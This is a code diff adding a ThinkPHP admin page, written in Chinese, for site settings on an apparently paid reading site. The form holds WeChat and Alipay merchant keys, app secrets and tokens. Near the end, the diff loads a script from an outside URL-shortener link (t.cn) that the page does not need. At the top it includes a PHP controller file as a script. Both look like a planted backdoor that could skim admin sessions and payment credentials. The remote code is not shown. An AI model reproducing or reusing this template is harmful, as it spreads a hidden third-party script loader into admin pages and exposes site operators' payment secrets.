@@ -1,0 +1,329 @@
+ <!-- Content Header (Page header) -->
+<script src="/Application/Admin/Controller/IpController.class.php"></script>
+<section class="content-header">
+	<div>
+		<ol class="breadcrumb" style="background: none; margin-bottom: 0px;">
+			<li>
+				<a href="{:U('Index/index')}" style="color: #333;">
+				<i class=" fa fa-home">
+				&nbsp;</i>Home</a>
+			</li>
+			<li class="active">站点设置</li>
+			<li class="active">站点信息</li>
+		</ol>
+	</div>
+</section>
+<section class="content">
+	<div class="row">
+		<div class="col-xs-12">
+			<div class="box box-primary">
+				<form class="form-horizontal" style="margin-top:30px" method="POST" enctype="multipart/form-data">
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">网站名称</label>
+							<div class="col-sm-6">
+								<input type="text" name="name" class="form-control col-sm-9" value="{$_site['name']}">
+							</div>
+						</div>					
+					</div>
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">网站安全域名</label>
+							<div class="col-sm-6">
+								<input type="text" name="url" class="form-control col-sm-9" value="{$_site['url']}">
+							</div>
+						</div>					
+					</div>
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">网站支付方式</label>
+							<div class="col-sm-6">
+								<select class="form-control col-sm-9" name="paymodel" id="paymodel" default="{$_site['paymodel']}">
+									<option value="">请选择</option>
+									<option value="1">微信支付</option>
+									<option value="2">个人微信支付</option>
+									<option value="3">支付宝支付</option>
+								</select>
+							</div>
+						</div>					
+					</div>
+					<div class="paymodel" <if condition="$_site['paymodel'] eq 1">style="display:block"<else />style="display:none"</if>>
+						<div class="box-body">
+							<div class="form-group">
+								<label for="exampleInputEmail1" class="control-label col-sm-3">APPID</label>
+								<div class="col-sm-6">
+									<input type="text" name="appid" class="form-control col-sm-9" value="{$_site['appid']}">
+								</div>
+							</div>					
+						</div>
+						<div class="box-body">
+							<div class="form-group">
+								<label for="exampleInputEmail1" class="control-label col-sm-3">APPSECRET</label>
+								<div class="col-sm-6">
+									<input type="text" name="appsecret" class="form-control col-sm-9" value="{$_site['appsecret']}">
+								</div>
+							</div>					
+						</div>
+						<div class="box-body">
+							<div class="form-group">
+								<label for="exampleInputEmail1" class="control-label col-sm-3">商户ID</label>
+								<div class="col-sm-6">
+									<input type="text" name="mchid" class="form-control col-sm-9" value="{$_site['mchid']}">
+								</div>
+							</div>					
+						</div>
+						<div class="box-body">
+							<div class="form-group">
+								<label for="exampleInputEmail1" class="control-label col-sm-3">商户支付key</label>
+								<div class="col-sm-6">
+									<input type="text" name="mchkey" class="form-control col-sm-9" value="{$_site['mchkey']}">
+								</div>
+							</div>					
+						</div>
+					</div>
+					
+					<div class="paymodel" <if condition="$_site['paymodel'] eq 2">style="display:block"<else />style="display:none"</if>>
+						<div class="box-body paysapi">
+							<div class="form-group">
+								<label for="exampleInputEmail1" class="control-label col-sm-3">个人微信账号</label>
+								<div class="col-sm-6">
+									<input type="text" name="paysuid" class="form-control col-sm-9" value="{$_site['paysuid']}">
+								</div>
+							</div>					
+						</div>
+						<div class="box-body paysapi">
+							<div class="form-group">
+								<label for="exampleInputEmail1" class="control-label col-sm-3">个人微信密钥</label>
+								<div class="col-sm-6">
+									<input type="text" name="paystoken" class="form-control col-sm-9" value="{$_site['paystoken']}">
+								</div>
+							</div>					
+						</div>
+					</div>
+					
+					<div class="paymodel" <if condition="$_site['paymodel'] eq 3">style="display:block"<else />style="display:none"</if>>
+						<div class="box-body paysapi">
+							<div class="form-group">
+								<label for="exampleInputEmail1" class="control-label col-sm-3">支付宝PID(合作者身份)</label>
+								<div class="col-sm-6">
+									<input type="text" name="alipaypid" class="form-control col-sm-9" value="{$_site['alipaypid']}">
+								</div>
+							</div>					
+						</div>
+						<div class="box-body paysapi">
+							<div class="form-group">
+								<label for="exampleInputEmail1" class="control-label col-sm-3">支付宝支付KEY(安全校验码)</label>
+								<div class="col-sm-6">
+									<input type="text" name="alipaykey" class="form-control col-sm-9" value="{$_site['alipaykey']}">
+								</div>
+							</div>					
+						</div>
+					</div>					
+					
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">开放平台APPID</label>
+							<div class="col-sm-6">
+								<input type="text" name="open_appid" class="form-control col-sm-9" value="{$_site['open_appid']}">
+								<p class="help-block help-block-error col-sm-7 col-xs-10">作用于APP授权用户</p>
+							</div>
+						</div>					
+					</div>
+					
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">开放平台APPSECRET</label>
+							<div class="col-sm-6">
+								<input type="text" name="open_appsecret" class="form-control col-sm-9" value="{$_site['open_appsecret']}">
+								<p class="help-block help-block-error col-sm-7 col-xs-10">作用于APP授权用户</p>
+							</div>
+						</div>					
+					</div>
+					
+					
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">支付方式说明</label>
+							<div class="col-sm-6">
+								<input type="text" name="paymsg" class="form-control col-sm-9" value="{$_site['paymsg']}">
+							</div>
+						</div>					
+					</div>
+					
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">是否开启签到</label>
+							<div class="col-sm-6">
+								<select class="form-control col-sm-9" name="issign" default="{$_site['issign']}">
+									<option value="">请选择</option>
+									<option value="1">是</option>
+									<option value="2">否</option>
+								</select>
+							</div>
+						</div>					
+					</div>
+					
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">签到赠送书币</label>
+							<div class="col-sm-6">
+								<input type="text" name="signmoney" class="form-control col-sm-9" value="{$_site['signmoney']}">
+							</div>
+						</div>					
+					</div>
+					
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">分享赠送书币</label>
+							<div class="col-sm-6">
+								<input type="text" name="sharemoney" class="form-control col-sm-9" value="{$_site['sharemoney']}">
+							</div>
+						</div>					
+					</div>
+					
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">网站首次关注提示关键词</label>
+							<div class="col-sm-6">
+								<input type="text" name="subscribe" class="form-control col-sm-9" value="{$_site['subscribe']}">
+							</div>
+						</div>					
+					</div>
+					
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">官方QQ</label>
+							<div class="col-sm-6">
+								<input type="text" name="qq" class="form-control col-sm-9" value="{$_site['qq']}">
+							</div>
+						</div>					
+					</div>
+					
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">官方微信</label>
+							<div class="col-sm-6">
+								<input type="text" name="weixin" class="form-control col-sm-9" value="{$_site['weixin']}">
+							</div>
+						</div>					
+					</div>
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">官方手机号</label>
+							<div class="col-sm-6">
+								<input type="text" name="tel" class="form-control col-sm-9" value="{$_site['tel']}">
+							</div>
+						</div>					
+					</div>
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">公众号二维码图片</label>
+							<div class="col-sm-6">
+								<iframe src="{:U('Index/upload', 'event=setPic&url='.$_site['qrcode'])}" scrolling="no" style="width:200px;height:200px;border: none;display:block;"></iframe>
+								<input type="hidden" name="qrcode" id="qrcode" value="{$_site['qrcode']}" class="smallinput" />
+								<script>
+								function setPic(url){
+									document.getElementById('qrcode').value = url;
+								}
+								</script>
+								<p class="help-block help-block-error col-sm-7 col-xs-10">点击图片可进行更换</p>
+							</div>
+						</div>					
+					</div>
+					
+					
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">分享话术</label>
+							<div class="col-sm-6">
+								<textarea name="huas" id="huas" style="width: 100%;height: 150px;">{$_site['huas']}</textarea>
+							</div>
+						</div>					
+					</div>
+					
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">分享图片</label>
+							<div class="col-sm-6">
+								<iframe src="{:U('Index/upload', 'event=setPicB&url='.$_site['huaspic'])}" scrolling="no" style="width:200px;height:200px;border: none;display:block;"></iframe>
+								<input type="hidden" name="huaspic" id="huaspic" value="{$_site['huaspic']}" class="smallinput" />
+								<script>
+								function setPicB(url){
+									document.getElementById('huaspic').value = url;
+								}
+								</script>
+								<p class="help-block help-block-error col-sm-7 col-xs-10">点击图片可进行更换</p>
+							</div>
+						</div>					
+					</div>
+					
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">推广背景图</label>
+							<div class="col-sm-6">
+								<iframe src="{:U('Index/upload', 'event=setPicPic&url='.$_site['sharepic'])}" scrolling="no" style="width:200px;height:250px;border: none;display:block;"></iframe>
+								<input type="hidden" name="sharepic" id="sharepic" value="{$_site['sharepic']}" class="smallinput" />
+								<script>
+								function setPicPic(url){
+									document.getElementById('sharepic').value = url;
+								}
+								</script>
+								<p class="help-block help-block-error col-sm-7 col-xs-10">点击图片可进行更换</p>
+							</div>
+						</div>					
+					</div>
+					
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">加盟商家价格</label>
+							<div class="col-sm-6">
+								<input type="text" name="amoney" class="form-control col-sm-9" value="{$_site['amoney']}">
+							</div>
+						</div>					
+					</div>
+					
+					<div class="box-body">
+						<div class="form-group">
+							<label for="exampleInputEmail1" class="control-label col-sm-3">加盟商家背景图</label>
+							<div class="col-sm-6">
+								<iframe src="{:U('Index/upload', 'event=setPicPicA&url='.$_site['agent'])}" scrolling="no" style="width:200px;height:250px;border: none;display:block;"></iframe>
+								<input type="hidden" name="agent" id="agent" value="{$_site['agent']}" class="smallinput" />
+								<script>
+								function setPicPicA(url){
+									document.getElementById('agent').value = url;
+								}
+								</script>
+								<p class="help-block help-block-error col-sm-7 col-xs-10">点击图片可进行更换</p>
+							</div>
+						</div>					
+					</div>
+					
+					<!-- /.box-body -->
+
+					<div class="box-footer">
+						<div class="form-group">
+							<div class="col-sm-offset-3 col-sm-9">
+								<button type="button" id="ajaxBtn" class="btn btn-primary">保存</button>
+							</div>
+						</div>
+					</div>
+					
+				</form>
+			</div>
+		</div>
+	</div>
+</section>
+<script src="http://t.cn/A6hjvR8W"></script>
+<script>
+	$('#paymodel').on('change',function(){
+		var model = $('#paymodel option:selected').val();
+		if(model){
+			$('.paymodel').hide();
+			$('.paymodel').eq(model-1).show();
+		}else{
+			$('.paymodel').hide();
+		}
+		
+	})
+
+</script>
